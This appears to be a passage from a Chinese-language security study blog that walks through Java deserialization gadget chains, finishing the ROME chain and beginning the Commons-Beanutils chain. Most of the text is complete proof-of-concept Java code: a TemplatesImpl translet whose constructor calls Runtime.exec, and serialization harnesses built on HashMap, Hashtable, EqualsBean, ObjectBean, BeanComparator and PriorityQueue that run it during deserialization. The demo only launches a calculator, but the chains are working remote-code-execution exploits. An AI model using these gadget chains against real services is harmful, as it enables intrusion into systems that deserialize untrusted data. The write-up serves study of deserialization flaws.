ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在来解决一下之前的问题。我打断点如下：\n确实成功直接获取到了我们想要利用的getOutputProperties()方法，但是当我如下打断点：\n然后调试，发现这里并不会进入到这个语句。这让我想到了之前CC5个人思考那里的问题，在我们动态加载字节码的时候，由于其中的过程，导致了在中间某一步直接报错退出。\n结合这个，我们来想一下如果利用TemplatesImpl.class，因为TemplatesImpl.class中的getter不止一个，所以其实很有可能在其中某个getter直接报错退出了，导致我们没能成功利用到想用的getOutputProperties()方法。\n然后我们再用原先错误的TemplatesImpl.class调试一下，还是打断点如下： 当调用到getStylesheetDOM()时，invoke那里确实就直接报错退出到catch部分了： 。这个getStylesheetDOM()方法如下： ——————\nOK，问题解决。\n所以注意：后面这里记到用Templates.class，而不是TemplatesImpl.class。\nhashCode() 这里是用的HashMap，但是同样的应该HashSet和Hashtable也行，这三个都是由hashCode链的。分析一下HashMap类： 同样的基本盘：\nTest.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在就是接入HashMap。\n还是很简单的。\n就是为了触发恶意ObjectBean的toString()方法，POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import javax.xml.transform.Templates; import com.sun.syndication.feed.impl.ObjectBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean bean = new ObjectBean(Templates.class,impl); HashMap hashMap = new HashMap(); ObjectBean x = new ObjectBean(ObjectBean.class,bean); hashMap.put(x,\u0026#34;fupanc\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功按照预期弹出两个计算机。（序列一个，反序列化一个）\n但是好像还是有点问题，构思一下，如何在反序列化的时候只弹出一个计算机：\n正常来说肯定会在序列化前的那个put()方法会调用一次完整的链，那里会导致异常输出，所以并不能成功利用。\n现在来看看在toString()方法获取getter并调用的代码：\n我想到了一个点，是否可以让这里的pds为null，从而在序列化前不进入if条件从而不会调用到getter方法，在put方法过后再反射修改值呢？\n那么这个pds变量的赋值也是分析过的，所以可以尝试找没有getter和setter方法的class对象？\n主要是要满足如下条件：\n也就是这个EqualsBean类实例化时必须满足相对应的实例。找了一下没找到。\n其实具体的方法可以参考后面的equals()方法链的解决方法，具体想法可以先看后面，这里就给一个POC后再简单说明：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.syndication.feed.impl.ToStringBean; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import javax.xml.transform.Templates; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean bean = new ToStringBean(Templates.class,impl); EqualsBean x = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(x,\u0026#34;fupanc\u0026#34;); setFieldValue(x,\u0026#34;_beanClass\u0026#34;,ToStringBean.class); setFieldValue(x,\u0026#34;_obj\u0026#34;,bean); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 简单说明一下，这里讲ObjectBean类都换成了相对应的类，并且其实这里最终调用的都是相对应的类：\n对于这里的hashCode()，其实调用的就是EqualsBean类的beanHashCode()方法：\n也就是漏洞触发点：\n在这里，我是将EqualsBean赋值时也是相对应的String.class和\u0026quot;fupanc\u0026quot;，符合EqualsBean类的构造函数方法，主要的不同点就是上面的beanHashCode()方法，原先的POC中是会直接调用到toString()方法触发一次调用链的，但是在这里，我将这个_obj变量赋值为了一个字符串实例，所以这里就是一个单纯的算hash的过程：\n那么后续就是成功往hashMap中放进了键值对，然后在反序列化时也是符合预期的：\n并且运行后只在反序列化时弹出一个计算机，成功修改。\n等如HashSet、Hashtable基本都差不多，如果过滤HashMap时要想到这些。\nequals()s 还是先来给出基本盘： Test.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在还是来想如何将基本盘接入Hashtable类。\n重点还是在于readObject()调用的reconstitutionPut()： 下面来分析一下。\n先从序列化过程说起。再总结一下前面的需求： 1.首先就是调用到的ObjectBean的equals()方法，现在着重看参数： 这里传入的other参数，继续看beanEquals()方法： 也就是这里的obj，单纯对obj来说就这前面的利用，由于我们想要正常利用后面的invoke()方法，所以需要满足this._beanClass.isInstance(obj)，这样才会进入else执行我们想用的代码。在这里我会尝试传入一个TemplatesImpl实例，但是真正利用的却并不是这个传入的TemplatesImpl类实例，看利用代码：\n也是之前一直说的，动态加载字节码后会直接报异常然后退出，所以这里真正利用到的其实只是这个bean1，而这个bean1对应的是_obj这个变量，那个这里的bean1，也就是我们构造的参数传递的值，起的真正作用是什么，就是为了满足this._beanClass.isInstance(obj)，也就只有这个作用了，具体参数传递后面会讲，作用也就是这个。\n2.现在再来看一下Hashtable的put方法：\n如何触发equals()方法，自己想了一下，本来想直接传入ObjectBean类实例的，但是对于这里的hash相等不一定。\n看了一下nivia师傅的文章，调用的是HashMap的equals()方法，这个equals()方法调用过程是和CC7的那条链差不多的。\n现在再来看一下HashMap的equals()调用过程：\nHashMap父类AbstractMap的equals()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map\u0026lt;?,?\u0026gt; m = (Map\u0026lt;?,?\u0026gt;) o; if (m.size() != size()) return false; try { Iterator\u0026lt;Entry\u0026lt;K,V\u0026gt;\u0026gt; i = entrySet().iterator(); while (i.hasNext()) { Entry\u0026lt;K,V\u0026gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null \u0026amp;\u0026amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } 在这个方法代码里面还有一处是调用的equals\n就是这里，只要控制这里的value为ObjectBean类实例即可。\n结合前面的需求，我们需要传入两个，一个是HashMap类实例，还有个就是TemplatesImpl类实例，但是看这里参数的传递，其实就是m.get(key)中的m对应前面说过的ObjectBean类的equals()方法的other，然后这里的m又是对应的传入的o：\n即： 这里的key。\n所以现在我们是需要传入两个HashMap类实例，然后这里对第二个HashMap类调用get时可以返回一个TemplatesImpl类实例。所以我们需要put进去。\n这里总结一下前面的需求：\nvalue赋值为ObjectBean类实例\n传入两个HashMap类实例并且需要有TemplatesImpl类实例的值。\n问题解决：\nvalue的赋值问题： 就是这个，所以我们还需要给HashMap传进去一个ObjectBean类实例的值。同时在CC7学习中，我们可以知道这里的e是hashMap0（假设会向Hashtable中传入hashMap0和hashMap1），这也是为什么在CC7那里要移除yy的原因。\n根据这个，我们的两个HashMap类就需要有逻辑。直接给代码：\n1 2 3 4 5 6 7 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); 比如说当前面拿到的第一个HashMap的key和value分别为zZ和bean，那么此时对于我们的第二个HashMap调用的就是get(\u0026ldquo;zZ\u0026rdquo;)，而我们这里需要的是impl，所以在第二个HashMap的键值对中我们就需要将键zZ的值设置为impl，所以这里也是需要反着来的原因。\n那么又是为什么要两个呢？\n按理说应该如下代码就行了：\n1 2 3 4 5 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); 这样不就已经对应了吗。这就与hash值相等有关系了，继续看后面。\nhash值相同的问题： 在前面也说过了，会传入两个HashMap类，所以会调用HashMap的父类AbstractMap的hashCode()方法，在CC7也有说过，过程中需要注意的点就是： 即在生成哈希码的时候需要考虑到key和value。\n毋庸置疑yy和zZ本身就已经哈希碰撞相同了。在我们之前的提出的疑问：为啥设置两个，这里就能给出答案：像前面那样只设置一个，key是相同了，但是这里的value是肯定不相同的。\n所以我们需要设置两个：\n1 2 3 4 5 6 7 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); ——————\n现在就可以尝试一下构造代码了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean bean = new ObjectBean(Templates.class,impl); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 运行后只弹出一个计算机，那么只能是序列化的时候弹出来的，打断点调试一下，发现确实是都没有进入序列化部分，并且是无法放入第二个键值对的：\n解决方法，还是反射更改，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); EqualsBean bean = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); setFieldValue(bean,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(bean,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 简单说明一下，EqualsBean类不用说了，就是ObjectBean类实例用的那个。ObjectBean类的equals()方法也是指向的我们要利用的那个： 对于反射修改，还是很妙的，直接在下面这一步就断出去了并且没有影响基本的赋值问题： 因为传入的TemplatesImpl类实例和String.class不是相对应的，所以没有进入下面的加载字节码的过程。直接讲eq赋值为了false，并且在最后是返回了这个值的：\n也就是说这里调用equals()方法后最后返回的是false，成功放入了第二个键值对，不会覆盖：\n非常妙，同时传入fupanc，是为了让equalsBean能够成功实例化：\n所以最终POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); EqualsBean bean = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); setFieldValue(bean,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(bean,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功按照预期弹出一个计算机，调试也没问题。\nOK，ROME链完结。\n","date":"2025-01-22T14:11:49+08:00","permalink":"https://fupanc-w1n.github.io/p/rome%E9%93%BE/","title":"Rome链"},{"content":"CB链 环境配置 环境配置 pom.xml添加：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-beanutils\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-beanutils\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.8.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-logging\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-logging\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 测试环境 commons-beanutils 1.8.3 commons-logging:commons-logging:1.2 JDK 8u411 commons-collections3.2.1 这里需要3.2.1的原因是后面要利用的BeanComparator要用： 踩了一下坑，这里4是用不了的\n正式学习 Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通java类对象（也称为JavaBean）的一些操作方法。\n而JavaBean是一个遵循特定写法的Java类，它通常具有如下特点：\n这个类必须具有一个无参的构造函数（一般我们没自定义构造函数的话默认的就是无参的构造函数） 属性必须私有化 私有化的属性必须通过public类型的方法暴露给其他程序，并且方法的命名也必须遵守一定的命名规范。 比如如下的Cat类就是一个最简单的JavaBean类：\n1 2 3 4 5 6 7 8 9 10 11 final public class Cat { private String name = \u0026#34;catalina\u0026#34;; public String getName() { return name; } public void setName(String name) { this.name = name; } } 它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。\n需要了解的类 PropertyUtils 它是对JavaBean进行操作的工具类，可单独为某个属性进行值的操作的工具类。它利用反射操作Bean的属性。这个类位于org.apache.commons.beanutils.PropertyUtils。\nPropertyUtils类中提供了一些public的静态方法，以便直接调用一些getter和setter方法：\ngetProperty：返回指定Bean的指定属性的值 getSimpleProperty：返回执行Bean的指定属性的值 setProperty：设置指定Bean的指定属性的值 setSimpleProperty：设置指定Bean的指定属性的值 看一个实例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import org.apache.commons.beanutils.PropertyUtils; public class Main{ private String name; public void setName(String name){ this.name = name; } public String getName(){ return this.name; } public static void main(String[] args) throws Exception { Main x = new Main(); PropertyUtils.setProperty(x,\u0026#34;name\u0026#34;,\u0026#34;fupanc\u0026#34;); System.out.println(x.getName()); x.setName(\u0026#34;haha\u0026#34;); System.out.println(PropertyUtils.getProperty(x,\u0026#34;name\u0026#34;)); } } 输出为：\n1 2 fupanc haha 看这个结果已经很容易知道前面的方法是干嘛的了。注意一下在调用方法时对于参数设置的问题。\n所以这里其实很容易看出，PropertyUtils.getProperty/setProperty方法，参数一定要注意，其实就可以理解为调用对应类变量的getter和setter方法。\nBeanComparator 前面也说过，其实CB链就是cc2的基础上新找了一个调用compare进行利用。在ysoserial中利用到的是BeanComparator类，这个类位于org.apache.commons.beanutils.BeanComparator，我们来看一下他的compare方法： 重点关注：\n前面说过getProperty()方法，在这里那么就会调用o1、o2对象的property变量的getter方法。\n在ysoserial中，CB链利用到了TemplatesImpl类，是通过PropertyUtils.getProperty来调用_outputProperties变量的getter方法，也就是TemplatesImpl的getOutputProperties方法来动态加载字节码，那么现在来看一下getOutputProperties()方法的源码： 这里调用了newTransformer()方法，在这里就可以进行一次恶意动态加载字节码的过程。\n那么在BeanComparator的compare()方法中，我们需要控制o1/o2为TemplatesImpl对象，this.Properties为outputProperties字符串。\n看一下BeanComparator类的构造方法，按照前面的描述，我们这里不需要自定义this.comparator变量，这里我们要利用到的是构造方法是：\n其实也就是下面那个，但是直接使用“默认”的comparator了。\n攻击构造 前面把基本的链给了出来，在这里还是利用的PriorityQueue作为序列化和反序列化的类，反序列化的时候是差不多的，最终到调用compare()方法的地方是：\n现在其实感觉和CC2差不多了。\n构造基本的字节码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 然后其他流程直接当做cc2那里看，现在简单分别分析一下过程。\n反序列化部分 和CC2差不多，PriorityQueue的readObject() =》heapify() =》siftDown() =》siftDownUsingComparator，最终也就是如下： 按照CC2过程来，假如我们add进两个值，那么这里的k为0，x为queue[0]的值，也就是我们第一个add进的值，同时看这个方法的内部，那么再分别说一下值问题：\nhalf：1 child：1 right：2 所以上面的c对应我们前面add进的第二个值，看大小情况可以知道是会进入第二个if条件语句，对应参数分别为（x：queue[0]，c：queue[1]）。\n结合前面对BeanComparator类的compare()方法的描述，可以知道我们这里至少需要一个为设计好了的TemplatesImpl类对象。\n序列化部分 add()有个部分，在第二次add进值的时候： 按照前面的说法，这里会进入BeanComparator的compare()方法，这里的k即是1，x即是我第二次要放入的值，e就是queue[0]，也就是我放入的第一个值。看这里的compare()的值，看参数（x：add2，e：queue[0]），在前面序列化的时候说了，我们需要至少add进一个TemplatesImpl类实例，那么其实在这里同样可以尝试一下构造在序列化时弹出计算机：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(\u0026#34;outputProperties\u0026#34;); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(tem); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 